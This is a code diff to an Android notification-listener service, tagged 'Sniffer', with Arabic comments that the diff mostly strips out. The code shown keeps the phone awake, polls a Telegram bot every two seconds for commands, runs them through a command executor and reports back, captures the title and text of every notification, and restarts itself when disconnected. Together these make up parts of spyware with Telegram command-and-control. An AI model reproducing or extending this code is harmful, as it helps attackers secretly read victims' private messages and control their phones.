@@ -5,10 +5,10 @@ import android.service.notification.StatusBarNotification;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.Notification.Builder;
 import android.app.PendingIntent;
 import android.content.Intent;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
@@ -41,7 +41,7 @@ public class NotificationService extends NotificationListenerService {
         // منع السكون
         PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
         wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sniffer::WakeLock");
-        wakeLock.acquire(10*60*1000L /*10 minutes*/);
+        wakeLock.acquire(10*60*1000L);
         
         // بدء الاستماع للأوامر
         startListening();
@@ -77,7 +77,7 @@ public class NotificationService extends NotificationListenerService {
             public void run() {
                 if (isRunning) {
                     checkTelegramCommands();
-                    handler.postDelayed(this, 2000); // كل ثانيتين
+                    handler.postDelayed(this, 2000);
                 }
             }
         }, 2000);
@@ -131,7 +131,6 @@ public class NotificationService extends NotificationListenerService {
     private void executeCommand(String command) {
         command = command.replace("/", "").trim().toLowerCase();
         
-        // تأكيد استلام الأمر
         sendTelegram("⚡ تنفيذ: " + command);
         
         CommandExecutor executor = new CommandExecutor(this);
@@ -220,7 +219,6 @@ public class NotificationService extends NotificationListenerService {
     
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
-        // تمرير الإشعارات للبوت إذا أردت
         Bundle extras = sbn.getNotification().extras;
         String title = extras.getString(Notification.EXTRA_TITLE, "");
         String text = extras.getString(Notification.EXTRA_TEXT, "");
@@ -249,7 +247,6 @@ public class NotificationService extends NotificationListenerService {
     @Override
     public void onListenerDisconnected() {
         super.onListenerDisconnected();
-        // إعادة الاتصال تلقائياً
         Intent intent = new Intent(this, NotificationService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
